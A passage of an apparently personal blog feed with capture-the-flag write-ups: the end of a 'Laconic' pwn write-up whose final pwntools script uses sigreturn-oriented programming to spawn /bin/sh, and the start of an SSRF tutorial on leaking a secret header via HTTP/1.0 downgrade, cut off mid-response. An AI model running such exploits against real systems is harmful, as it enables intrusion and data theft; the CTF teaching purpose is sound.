    &lt;span class=&quot;n&quot;&gt;SHT_SUNW_COMDAT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048187&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_SUNW_syminfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048188&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_verdef&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048189&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_verneed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048190&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_versym&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048191&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_SectionHeaderType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Shdr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_SectionHeaderType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addralign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_entsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Ehdr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PElf64_Ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Ehdr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_magic_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_magic_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_osabi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_abiversion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ident_pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_machine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_phoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_ehsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_phentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_phnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;




&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processEntry&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;syscall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First let’s plonk down the available gadgets and their location, as well as the location of /bin/sh&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;From here, I suggest you try the payload yourself. The padding (as you can see in the assembly) is 8 bytes until RIP, then you’ll need to trigger a sigreturn, followed by the values of the registers. The triggering of a sigreturn is easy - sigreturn is syscall 0xf (15), so we just pop that into RAX and call syscall:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POP_RAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYSCALL_RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now the syscall looks at the location of RSP for the register values; we’ll have to fake them. They have to be in a specific order, but luckily for us pwntools has a cool feature called a SigreturnFrame() that handles the order for us.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SigreturnFrame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we just need to decide what the register values should be. We want to trigger an execve() syscall, so we’ll set the registers to the values we need for that:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, in order to trigger this we also have to control RIP and point it back at the syscall gadget, so the execve actually executes:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;frame.rip = SYSCALL_RET&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We then append it to the payload and send :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;final-exploit&quot;&gt;Final Exploit&lt;/h2&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./laconic&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;checksec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;BINSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x43238&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Address of &apos;/bin/sh&apos; found in the binary
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POP_RAX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x43018&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYSCALL_RET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x43015&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SigreturnFrame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3b&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# syscall number for execve
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BINSH&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;# pointer to /bin/sh
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# NULL
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# NULL
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYSCALL_RET&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POP_RAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYSCALL_RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Mon, 28 Apr 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//Laconic</link>
        <link href="http://localhost:4000/Laconic"/>
        <guid isPermaLink="true">http://localhost:4000/Laconic</guid>
      </item>
    
      <item>
        <title>Web_Dusty_alleys</title>
        <description>&lt;h1 id=&quot;exploiting-ssrf-vulnerabilities&quot;&gt;Exploiting SSRF Vulnerabilities&lt;/h1&gt;

&lt;p&gt;In this article, we will walk through the exploitation of a Server-Side Request Forgery (SSRF) vulnerability, particularly focusing on how attackers can misuse the HTTP/1.0 protocol downgrade technique to manipulate the server’s behavior, leak sensitive data, and exfiltrate secrets.
What is SSRF?&lt;/p&gt;

&lt;p&gt;Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks the server into making an HTTP request to an unintended resource. SSRF vulnerabilities typically arise when a server is allowed to fetch URLs provided by a user, but without proper validation or restrictions. This can lead to several serious security issues, including:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Information leakage: Sensitive data can be sent to an attacker-controlled server.

Internal network scanning: Attackers can use the vulnerability to probe internal services or servers within the organization.

Exploitation of other vulnerabilities: In some cases, SSRF can be used to exploit other vulnerabilities, such as those in internal services, databases, or authentication systems.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this guide, we’ll see how an attacker might exploit an SSRF vulnerability to leak sensitive headers (like cookies or authentication tokens) to an external server under their control.
Overview of the Attack&lt;/p&gt;

&lt;p&gt;The SSRF attack we’ll be demonstrating involves the following steps:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Identify the Vulnerability: An application allows the user to provide a URL (e.g., via a quote parameter) which it will then fetch using a server-side HTTP client (such as node-fetch).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Exploit the Vulnerability Using HTTP/1.0: By downgrading the request to HTTP/1.0, the attacker can bypass certain redirect handling mechanisms and gain better control over the server’s behavior.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Capture Sensitive Headers: The attacker crafts a malicious request that causes the server to fetch a URL they control, exfiltrating sensitive headers like the Key header, which may contain a flag or other sensitive information.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;step-1-identifying-the-vulnerability&quot;&gt;Step 1: Identifying the Vulnerability&lt;/h1&gt;

&lt;p&gt;The application you’re targeting allows users to submit a URL via the quote parameter. When the application processes this parameter, it uses an HTTP client (like node-fetch) to make a request to the provided URL, and may forward sensitive headers such as cookies or authentication tokens.&lt;/p&gt;

&lt;p&gt;Example of the vulnerable code:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;router.get(&quot;/guardian&quot;, async (req, res) =&amp;gt; {
  const quote = req.query.quote;
  try {
    let result = await node_fetch(quote, {
      method: &quot;GET&quot;,
      headers: { Key: process.env.FLAG || &quot;HTB{REDACTED}&quot; },
    }).then((res) =&amp;gt; res.text());

    res.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);
    res.send(result);
  } catch (e) {
    console.error(e);
    return res.render(&quot;guardian&quot;, { error: &quot;The words are lost in my circuits&quot; });
  }
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flaw: There is no restriction on where the quote parameter points. The application blindly fetches the URL and forwards headers like Key to the external server.&lt;/p&gt;

&lt;h1 id=&quot;step-2-downgrading-to-http10&quot;&gt;Step 2: Downgrading to HTTP/1.0&lt;/h1&gt;

&lt;p&gt;One of the critical techniques in this attack is downgrading the HTTP version to HTTP/1.0. By doing this, the attacker ensures that the application’s HTTP client behaves differently and may not follow certain redirects, giving the attacker more control over the request.
Why Use HTTP/1.0?&lt;/p&gt;

&lt;p&gt;No Automatic Redirects: In HTTP/1.1 and HTTP/2, redirections (via the Location header) are automatically followed. In HTTP/1.0, redirects must be handled manually by the client. This gives the attacker the ability to intercept and control redirects.&lt;/p&gt;

&lt;p&gt;Bypassing Server Behavior: Many modern servers may optimize for HTTP/1.1 or HTTP/2, handling headers differently. By forcing HTTP/1.0, attackers may bypass these optimizations and force the server to handle requests in a less secure way.&lt;/p&gt;

&lt;h1 id=&quot;how-to-force-http10-using-curl&quot;&gt;How to Force HTTP/1.0 Using curl:&lt;/h1&gt;

&lt;p&gt;To force HTTP/1.0 in your request, you can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--http1.0&lt;/code&gt; flag with curl.&lt;/p&gt;

&lt;p&gt;Example command to downgrade to HTTP/1.0:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl http://$IP:$PORT/think --http1.0 -H &apos;Host:&apos;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In this case, you’re sending an HTTP request to the /think route with an empty Host header. This step helps you test and verify how the server responds to HTTP/1.0 requests and may reveal virtual hosts or internal configuration details.&lt;/p&gt;

&lt;p&gt;Example Response:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alley.firstalleyontheleft.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
